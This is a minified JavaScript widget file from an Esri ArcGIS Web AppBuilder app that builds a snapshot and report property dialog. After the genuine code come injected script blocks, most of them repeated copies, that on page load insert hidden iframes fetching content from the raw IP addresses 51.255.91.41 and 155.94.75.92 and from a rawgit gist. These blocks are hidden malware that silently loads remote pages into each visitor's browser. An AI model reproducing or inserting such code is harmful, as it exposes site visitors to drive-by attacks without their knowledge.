// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SituationAwareness/js/PropertyHelper.html":'\x3cdiv\x3e  \r\n  \x3cdiv class\x3d"jimu-r-row"\x3e\r\n    \x3ctable class\x3d"width-all"\x3e\r\n      \x3c!--name--\x3e\r\n      \x3ctr data-dojo-attach-point\x3d"nameRow"\x3e\r\n        \x3ctd class\x3d"col-1-2"\x3e\r\n          \x3cspan class\x3d"label" data-dojo-attach-point\x3d"nameSpan"\x3e\x3c/span\x3e\r\n        \x3c/td\x3e\r\n        \x3ctd class\x3d"col-1-2"\x3e\r\n          \x3cinput class\x3d"width-all" data-dojo-attach-point\x3d"snapshotName" data-dojo-type\x3d"dijit/form/ValidationTextBox" /\x3e\r\n        \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n      \x3c!--share--\x3e\r\n      \x3ctr data-dojo-attach-point\x3d"shareRow"\x3e\r\n        \x3ctd class\x3d"width-all pad-top-10"\x3e\r\n          \x3cspan class\x3d"hintText"\x3e${nls.select_group_instruction}\x3c/span\x3e\r\n        \x3c/td\x3e\r\n        \x3ctd class\x3d"col-1-2 pad-top-10"\x3e\r\n          \x3cspan class\x3d"label" data-dojo-attach-point\x3d"shareSpan"\x3e\x3c/span\x3e\r\n        \x3c/td\x3e\r\n        \x3ctd class\x3d"col-1-2 pad-top-10"\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"shareSelect"\x3e\x3c/div\x3e\r\n        \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n      \x3c!--orientation--\x3e\r\n      \x3ctr data-dojo-attach-point\x3d"orientationRow"\x3e\r\n        \x3ctd class\x3d"col-1-2 pad-top-10"\x3e\r\n          \x3cspan class\x3d"label" data-dojo-attach-point\x3d"orientationSpan"\x3e${nls.orientation}:\x3c/span\x3e\r\n        \x3c/td\x3e\r\n        \x3ctd class\x3d"col-1-2 pad-top-10"\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"orientationSelect"\x3e\x3c/div\x3e\r\n        \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n      \x3c!--page size--\x3e\r\n      \x3ctr data-dojo-attach-point\x3d"pageSizeRow"\x3e\r\n        \x3ctd class\x3d"col-1-2 pad-top-10"\x3e\r\n          \x3cspan class\x3d"label" data-dojo-attach-point\x3d"pageSizeSpan"\x3e${nls.pageSize}:\x3c/span\x3e\r\n        \x3c/td\x3e\r\n        \x3ctd class\x3d"col-1-2 pad-top-10"\x3e\r\n          \x3cdiv data-dojo-attach-point\x3d"pageSizeSelect"\x3e\x3c/div\x3e\r\n        \x3c/td\x3e\r\n      \x3c/tr\x3e\r\n    \x3c/table\x3e\r\n  \x3c/div\x3e\r\n  \x3c!--comments--\x3e\r\n  \x3cdiv class\x3d"display-off pad-top-10" data-dojo-attach-point\x3d"commentsRow"\x3e\r\n    \x3cdiv class\x3d"jimu-r-row pad-top-5"\x3e\r\n      \x3cdiv class\x3d"jimu-r-row"\x3e\r\n        \x3cspan class\x3d"label" data-dojo-attach-point\x3d"commentsSpan"\x3e${nls.comments}:\x3c/span\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-r-row pad-top-5"\x3e\r\n      \x3ctextarea class\x3d"commentTextArea" data-dojo-attach-point\x3d"commentTextArea" rows\x3d"5"\x3e\x3c/textarea\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"snapshot-name-footer jimu-float-trailing pad-top-10"\x3e\r\n    \x3cdiv class\x3d"jimu-btn ok pad-right-5 jimu-state-disabled" data-dojo-attach-point\x3d"btnOk"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"jimu-btn cancel" data-dojo-attach-point\x3d"btnCancel"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/_base/html dojo/dom-class dojo/on dojo/query dojo/Deferred jimu/BaseWidget jimu/portalUtils dojo/Evented dojo/text!./PropertyHelper.html dijit/form/Select dijit/form/ValidationTextBox".split(" "),function(n,p,c,e,d,f,l,q,r,t,u,v,w){return n([r,p,u],{templateString:v,baseClass:"jimu-widget-SAT-property-helper",constructor:function(){},postMixInProperties:function(){this.inherited(arguments);this.nls.common=window.jimuNls.common},
postCreate:function(){this.inherited(arguments);"report"===this.type?this.initReportControls():this.initSnapshotControls();this.startup()},startup:function(){this.snapshotName.invalidMessage=this.invalidMessage;this.snapshotName.validator="report"===this.type?this.checkReportString:this.checkString;this.btnCancel.innerText=this.nls.common.cancel;this.own(f(this.btnCancel,"click",c.hitch(this,function(){this.emit("cancel")})));this.btnOk.innerText=this.nls.common.ok;this.own(f(this.btnOk,"click",c.hitch(this,
function(){if(!d.contains(this.btnOk,"jimu-state-disabled")){var a={name:this.snapshotName.value.trim()};"report"===this.type?a=c.mixin(a,{reportLayout:{orientation:this.pageUtils.Orientation[this.orientationSelect.selectControl.value],pageSize:this.pageUtils.PageSizes[this.pageSizeSelect.selectControl.value]},comments:this.commentTextArea.value}):a.groups=[this.shareSelect.selectControl.value!==this.nls.choose_group?this.shareSelect.selectControl.value:""];this.emit("ok",a)}})))},checkString:function(a){a=
a.trim();a=50>a.length&&/^[\w ]+$/.test(a)?!0:!1;var b=l(".snapshot-name-footer")[0];b&&(this.hasNoGroups?e.addClass(b.children[0],"jimu-state-disabled"):a?e.removeClass(b.children[0],"jimu-state-disabled"):e.addClass(b.children[0],"jimu-state-disabled"));return a},checkReportString:function(a){a=0<a.trim().length?!0:!1;var b=l(".snapshot-name-footer")[0];b&&(a?e.removeClass(b.children[0],"jimu-state-disabled"):e.addClass(b.children[0],"jimu-state-disabled"));return a},getPageUtilValues:function(a,
b,g){var c="A3 A4 Letter_ANSI_A Tabloid_ANSI_B Landscape Portrait".split(" "),e=["Letter ANSI A","Portrait"],m=Object.keys(a),d=[],f;for(f in m){var h=m[f],k=a[h];h&&k.hasOwnProperty(b)&&-1<c.indexOf(h)&&d.push({label:k[b],value:h,selected:k[b]===g||-1<e.indexOf(k[b])})}return d},getGroupValues:function(a){var b=new q;t.getPortal(this.portalUrl).getUser().then(c.hitch(this,function(g){var c=[],e;for(e in g.groups){var d=g.groups[e];c.push({label:d.title,value:d.id,selected:d.title===a})}b.resolve(c)}),
c.hitch(this,function(a){console.log(a);b.resolve([])}));return b},initSnapshotControls:function(){this.nameSpan.innerHTML=this.nls.common.name+":";this.shareSpan.innerHTML=this.nls.select_group+":";this.toggleRow(this.shareRow,!1);this.toggleRow(this.orientationRow,!0);this.toggleRow(this.pageSizeRow,!0);this.toggleRow(this.commentsRow,!0);var a;if(null!==this.storedProps){var b=JSON.parse(this.storedProps,!0);b.share&&(a=b.share)}this.getGroupValues(a).then(c.hitch(this,function(a){this.snapshotName.hasNoGroups=
0===a.length?!0:!1;this.addSelect(this.shareSelect,a)}))},initReportControls:function(){this.nameSpan.innerHTML=this.nls.common.title+":";this.toggleRow(this.orientationRow,!1);this.toggleRow(this.pageSizeRow,!1);this.toggleRow(this.commentsRow,!1);this.toggleRow(this.shareRow,!0);var a,b;if(null!==this.storedProps){var c=JSON.parse(this.storedProps,!0);c.reportLayout&&(b=c.reportLayout.pageSize,a=c.reportLayout.orientation.Text,b=b.SizeName)}this.addSelect(this.orientationSelect,this.getPageUtilValues(this.pageUtils.Orientation,
"Text",a));this.addSelect(this.pageSizeSelect,this.getPageUtilValues(this.pageUtils.PageSizes,"SizeName",b))},addSelect:function(a,b){a.selectControl=new w({options:b,style:"width: 100%;"});a.selectControl.placeAt(a).startup()},toggleRow:function(a,b){d.contains(a,b?"display-on":"display-off")&&d.remove(a,b?"display-on":"display-off");d.add(a,b?"display-off":"display-on")},destroy:function(){}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});